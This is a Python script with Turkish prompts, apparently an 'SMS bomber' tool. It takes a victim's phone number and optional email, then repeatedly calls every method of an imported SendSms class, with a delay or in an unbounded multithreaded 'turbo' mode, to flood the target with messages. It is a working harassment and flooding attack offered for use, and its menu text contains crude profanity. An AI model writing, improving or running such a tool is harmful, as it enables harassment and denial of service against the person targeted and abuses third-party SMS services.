from colorama import Fore, Style, init
from time import sleep
from os import system
from sms import SendSms
import threading

init(autoreset=True)

rainbow_colors = [Fore.RED, Fore.LIGHTRED_EX, Fore.YELLOW, Fore.GREEN, Fore.CYAN, Fore.BLUE, Fore.MAGENTA]

def rainbow_text(text):
    colored = ""
    color_index = 0
    for char in text:
        if char.strip() == "":
            colored += char
        else:
            colored += rainbow_colors[color_index % len(rainbow_colors)] + char
            color_index += 1
    return colored + Style.RESET_ALL

servisler_sms = []
for attribute in dir(SendSms):
    if callable(getattr(SendSms, attribute)) and not attribute.startswith("__"):
        servisler_sms.append(attribute)

while True:
    system("cls||clear")
    banner = """
███████╗███████╗███████╗██████╗  ██████╗ ██╗    ██╗
╚══███╔╝██╔════╝██╔════╝██╔══██╗██╔═══██╗██║    ██║
  ███╔╝ █████╗  █████╗  ██████╔╝██║   ██║██║ █╗ ██║
 ███╔╝  ██╔══╝  ██╔══╝  ██╔══██╗██║   ██║██║███╗██║
███████╗███████╗███████╗██║  ██║╚██████╔╝╚███╔███╔╝
╚══════╝╚══════╝╚══════╝╚═╝  ╚═╝ ╚═════╝  ╚══╝╚══╝
"""
    print(rainbow_text(banner))
    print(rainbow_text(f"Sms servis sayısı: {len(servisler_sms)}"))
    print(rainbow_text("by @zerowbabaa\n"))

    try:
        menu = input(rainbow_text(
            "1- SMS Gönder (RELAX)\n"
            "2- SMS Gönder (DEHŞET)\n"
            "3- SİKTİR GİT\n"
            "Seçim: "
        ))
        if menu == "":
            continue
        menu = int(menu)
    except ValueError:
        print(rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene"))
        sleep(3)
        continue

    if menu == 3:
        print(rainbow_text("SİKTİR OLUP GİDİLİYOR..."))
        break

    elif menu in [1, 2]:
        tel_no = input(rainbow_text("Telefon numarası (başında +90 olmasın): "))
        try:
            int(tel_no)
            if len(tel_no) != 10:
                raise ValueError
        except ValueError:
            print(rainbow_text("Hatalı telefon numarası nabion aq tekrar dene"))
            sleep(3)
            continue

        mail = input(rainbow_text("Mail adresi (bilmiyorsan boş bırak): "))
        if ("@" not in mail or ".com" not in mail) and mail != "":
            print(rainbow_text("Hatalı mail adresi nabion aq tekrar dene"))
            sleep(3)
            continue

        if menu == 1:
            try:
                kere = input(rainbow_text("Kaç adet SMS göndermek istiyon kral (sonsuz için boş bırak): "))
                kere = int(kere) if kere else None
            except ValueError:
                print(rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene"))
                sleep(3)
                continue

            try:
                aralik = int(input(rainbow_text("Kaç saniye aralıkla göndermek istiyorsun kral: ")))
            except ValueError:
                print(rainbow_text("Hatalı giriş yaptın nabion aq tekrar dene"))
                sleep(3)
                continue

            sms = SendSms(tel_no, mail)
            if kere is None:
                while True:
                    for fonk in servisler_sms:
                        getattr(sms, fonk)()
                        sleep(aralik)
            else:
                while sms.adet < kere:
                    for fonk in servisler_sms:
                        if sms.adet >= kere:
                            break
                        getattr(sms, fonk)()
                        sleep(aralik)
        else:
            send_sms = SendSms(tel_no, mail)
            dur = threading.Event()
            def turbo():
                while not dur.is_set():
                    threads = []
                    for fonk in servisler_sms:
                        t = threading.Thread(target=getattr(send_sms, fonk), daemon=True)
                        threads.append(t)
                        t.start()
                    for t in threads:
                        t.join()

            try:
                turbo()
            except KeyboardInterrupt:
                dur.set()
                print(rainbow_text("Ctrl+C algılandı. Menüye dönülüyor..."))
                sleep(2)
